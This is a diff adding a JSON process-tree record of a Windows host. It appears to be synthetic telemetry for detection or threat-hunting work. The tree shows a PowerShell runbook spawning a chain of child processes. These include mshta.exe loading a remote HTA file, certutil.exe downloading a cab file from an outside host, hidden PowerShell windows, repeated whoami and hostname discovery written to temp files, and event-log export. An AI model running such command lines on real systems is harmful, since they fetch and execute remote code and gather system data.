@@ -1,0 +1,245 @@
+{
+  "pid": 343180,
+  "ppid": 0,
+  "name": "powershell.exe",
+  "command": "powershell.exe -NoProfile -File \"C:\\IT\\Scripts\\Runbook_f87a5796.ps1\"",
+  "children": [
+    {
+      "pid": 343184,
+      "ppid": 343180,
+      "name": "cmd.exe",
+      "command": "cmd.exe /c \"tasklist /svc\"",
+      "children": [
+        {
+          "pid": 343187,
+          "ppid": 343184,
+          "name": "powershell.exe",
+          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 2\"",
+          "children": [
+            {
+              "pid": 343188,
+              "ppid": 343187,
+              "name": "mshta.exe",
+              "command": "mshta.exe \"http://helpdesk-tools.corp.local/scripts/sync.hta\"",
+              "children": [
+                {
+                  "pid": 343194,
+                  "ppid": 343188,
+                  "name": "whoami.exe",
+                  "command": "whoami.exe /groups > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\who_5cf265c8.txt\"",
+                  "children": [
+                    {
+                      "pid": 343198,
+                      "ppid": 343194,
+                      "name": "certutil.exe",
+                      "command": "certutil.exe -urlcache -split -f \"http://cdn.contoso-updates.com/patch/runtime.cab\" \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\cache.cer\"",
+                      "children": [
+                        {
+                          "pid": 343203,
+                          "ppid": 343198,
+                          "name": "whoami.exe",
+                          "command": "whoami.exe",
+                          "children": [
+                            {
+                              "pid": 343205,
+                              "ppid": 343203,
+                              "name": "hostname.exe",
+                              "command": "hostname.exe > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\host_3e72b048.txt\"",
+                              "children": [
+                                {
+                                  "pid": 343211,
+                                  "ppid": 343205,
+                                  "name": "whoami.exe",
+                                  "command": "whoami.exe /priv > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\who_88d7d4e1.txt\"",
+                                  "children": [
+                                    {
+                                      "pid": 343217,
+                                      "ppid": 343211,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\who_d3d75a58.txt\"",
+                                      "children": []
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        },
+                        {
+                          "pid": 343224,
+                          "ppid": 343198,
+                          "name": "powershell.exe",
+                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 24\"",
+                          "children": [
+                            {
+                              "pid": 343229,
+                              "ppid": 343224,
+                              "name": "tasklist.exe",
+                              "command": "tasklist.exe /fi \"imagename eq svchost.exe\"",
+                              "children": [
+                                {
+                                  "pid": 343234,
+                                  "ppid": 343229,
+                                  "name": "whoami.exe",
+                                  "command": "whoami.exe /groups > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\who_41201656.txt\"",
+                                  "children": [
+                                    {
+                                      "pid": 343235,
+                                      "ppid": 343234,
+                                      "name": "hostname.exe",
+                                      "command": "hostname.exe > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\host_6d0e899a.txt\"",
+                                      "children": [
+                                        {
+                                          "pid": 343236,
+                                          "ppid": 343235,
+                                          "name": "wevtutil.exe",
+                                          "command": "wevtutil.exe epl \"Microsoft-Windows-TaskScheduler/Operational\" \"C:\\ProgramData\\Litware\\Logs\\Microsoft-Windows-TaskScheduler_Operational_ce3b1ad4.evtx\"",
+                                          "children": [
+                                            {
+                                              "pid": 343239,
+                                              "ppid": 343236,
+                                              "name": "powershell.exe",
+                                              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'whoami.exe' -ArgumentList '/priv > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\who_673b3668.txt\"' -Wait\"",
+                                              "children": [
+                                                {
+                                                  "pid": 343241,
+                                                  "ppid": 343239,
+                                                  "name": "powershell.exe",
+                                                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 13\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 343248,
+                                                      "ppid": 343241,
+                                                      "name": "makecab.exe",
+                                                      "command": "makecab.exe \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\trace.etl\" \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\trace.cab\"",
+                                                      "children": [
+                                                        {
+                                                          "pid": 343255,
+                                                          "ppid": 343248,
+                                                          "name": "hostname.exe",
+                                                          "command": "hostname.exe",
+                                                          "children": [
+                                                            {
+                                                              "pid": 343257,
+                                                              "ppid": 343255,
+                                                              "name": "whoami.exe",
+                                                              "command": "whoami.exe /all > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\who_c66234c8.txt\"",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 343264,
+                                                                  "ppid": 343257,
+                                                                  "name": "hostname.exe",
+                                                                  "command": "hostname.exe > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\host_7db23112.txt\"",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 343268,
+                                                                      "ppid": 343264,
+                                                                      "name": "whoami.exe",
+                                                                      "command": "whoami.exe /priv",
+                                                                      "children": [
+                                                                        {
+                                                                          "pid": 343271,
+                                                                          "ppid": 343268,
+                                                                          "name": "hostname.exe",
+                                                                          "command": "hostname.exe > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\host_ba32b665.txt\"",
+                                                                          "children": [
+                                                                            {
+                                                                              "pid": 343274,
+                                                                              "ppid": 343271,
+                                                                              "name": "whoami.exe",
+                                                                              "command": "whoami.exe /all",
+                                                                              "children": [
+                                                                                {
+                                                                                  "pid": 343278,
+                                                                                  "ppid": 343274,
+                                                                                  "name": "powershell.exe",
+                                                                                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'whoami.exe' -ArgumentList '' -Wait\"",
+                                                                                  "children": [
+                                                                                    {
+                                                                                      "pid": 343285,
+                                                                                      "ppid": 343278,
+                                                                                      "name": "hostname.exe",
+                                                                                      "command": "hostname.exe > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\host_a33e3c1b.txt\"",
+                                                                                      "children": [
+                                                                                        {
+                                                                                          "pid": 343291,
+                                                                                          "ppid": 343285,
+                                                                                          "name": "hostname.exe",
+                                                                                          "command": "hostname.exe > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\host_777e67ca.txt\"",
+                                                                                          "children": []
+                                                                                        }
+                                                                                      ]
+                                                                                    },
+                                                                                    {
+                                                                                      "pid": 343296,
+                                                                                      "ppid": 343278,
+                                                                                      "name": "choice.exe",
+                                                                                      "command": "choice.exe /d y /t 13 > nul",
+                                                                                      "children": [
+                                                                                        {
+                                                                                          "pid": 343302,
+                                                                                          "ppid": 343296,
+                                                                                          "name": "hostname.exe",
+                                                                                          "command": "hostname.exe",
+                                                                                          "children": [
+                                                                                            {
+                                                                                              "pid": 343306,
+                                                                                              "ppid": 343302,
+                                                                                              "name": "hostname.exe",
+                                                                                              "command": "hostname.exe > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\host_07e68a9f.txt\"",
+                                                                                              "children": [
+                                                                                                {
+                                                                                                  "pid": 343312,
+                                                                                                  "ppid": 343306,
+                                                                                                  "name": "hostname.exe",
+                                                                                                  "command": "hostname.exe > \"C:\\Users\\vivaan.nair\\AppData\\Local\\Temp\\host_0fc2d5f4.txt\"",
+                                                                                                  "children": []
+                                                                                                }
+                                                                                              ]
+                                                                                            }
+                                                                                          ]
+                                                                                        }
+                                                                                      ]
+                                                                                    }
+                                                                                  ]
+                                                                                }
+                                                                              ]
+                                                                            }
+                                                                          ]
+                                                                        }
+                                                                      ]
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
